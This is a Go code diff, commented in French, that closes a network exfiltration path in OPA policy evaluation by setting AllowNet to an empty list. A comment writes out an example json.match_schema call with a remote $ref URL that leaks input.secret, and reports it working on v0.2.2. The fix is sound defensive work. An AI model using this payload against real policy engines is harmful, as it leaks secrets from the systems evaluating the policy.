@@ -45,6 +45,19 @@ func restrictedCapabilities() *ast.Capabilities {
 			kept = append(kept, b)
 		}
 		caps.Builtins = kept
+		// AllowNet vide (non nil) = AUCUN hôte joignable. Retirer les primitives
+		// réseau ne suffit pas : OPA résout les `$ref` distants d'un JSON-Schema en
+		// HTTP au moment de l'ÉVALUATION, si bien qu'une politique chargée à chaud
+		// exfiltre encore l'input via json.match_schema / json.verify_schema :
+		//
+		//   json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [url, input.secret])})
+		//
+		// Mesuré sur v0.2.2 : le serveur témoin reçoit /leak/EXFIL-TOKEN, sans erreur
+		// remontée à l'appelant. `AllowNet: nil` (le défaut de
+		// CapabilitiesForThisVersion) signifie « tous les hôtes ». Le champ n'est
+		// honoré par le chargeur de schémas qu'à partir d'OPA 1.20 : c'est la raison
+		// du bump qui accompagne ce correctif.
+		caps.AllowNet = []string{}
 		restrictedCaps = caps
 	})
 	return restrictedCaps
